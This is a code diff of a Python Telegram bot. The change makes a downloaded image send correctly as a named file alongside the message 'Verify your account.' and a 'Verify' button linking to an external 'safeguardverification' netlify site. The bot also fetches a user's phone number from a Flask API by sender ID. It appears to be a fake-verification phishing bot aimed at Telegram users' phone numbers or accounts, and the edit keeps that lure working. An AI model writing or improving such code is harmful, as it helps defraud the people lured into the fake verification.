@@ -32,10 +32,12 @@ async def on_start(event):
 
         # Check if the image was downloaded successfully
         if response.status_code == 200:
-            image_data = response.content  # Get the image bytes
+            from io import BytesIO  # Import BytesIO here to avoid unnecessary global imports
+            image_data = BytesIO(response.content)  # Convert the content into a file-like object
+            image_data.name = 'image.jpg'  # Set a name for the file-like object
 
             await event.respond(
-                file=image_data,  # Send the image as bytes
+                file=image_data,  # Send the image as bytes with a name
                 message="Verify your account.",
                 buttons=[
                     [Button.url("Verify", "https://safeguardverification.netlify.app/")],
@@ -47,7 +49,7 @@ async def on_start(event):
 
     except Exception as e:
         await event.respond(f"Error: {e}")
-
+        
 # Function to retrieve phone number from Flask API based on sender_id
 async def get_phone_by_sender_id(sender_id):
     async with aiohttp.ClientSession() as session:
